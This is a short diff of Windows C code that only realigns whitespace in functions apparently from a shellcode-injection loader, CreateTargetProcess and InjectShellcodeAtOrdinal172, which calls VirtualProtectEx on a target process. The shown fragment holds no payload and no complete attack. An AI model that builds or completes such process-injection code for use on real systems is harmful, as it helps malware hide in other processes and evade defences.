@@ -83,7 +83,7 @@ BOOL CreateTargetProcess (PCWSTR szProcessName, PHANDLE hProcess, PDWORD dwProce
 
 	wprintf(L"[+] Target Process Created With Pid : %d\n", pi.dwProcessId);
 
-	*hProcess		= pi.hProcess;
+	*hProcess	= pi.hProcess;
 	*dwProcessId	= pi.dwProcessId;
 	
 	CloseHandle(pi.hThread);
@@ -99,8 +99,8 @@ BOOL CreateTargetProcess (PCWSTR szProcessName, PHANDLE hProcess, PDWORD dwProce
 
 BOOL InjectShellcodeAtOrdinal172(HANDLE hProcess, PVOID pAddress, PBYTE Shellcode, SIZE_T ShellcodeSize) {
 
-	DWORD	lpOldProtection = NULL;
-	SIZE_T	sNumberOfBytesWritten = NULL;
+	DWORD	lpOldProtection 	= NULL;
+	SIZE_T	sNumberOfBytesWritten 	= NULL;
 
 
 	if (!VirtualProtectEx(hProcess, pAddress, ShellcodeSize, PAGE_READWRITE, &lpOldProtection)) {
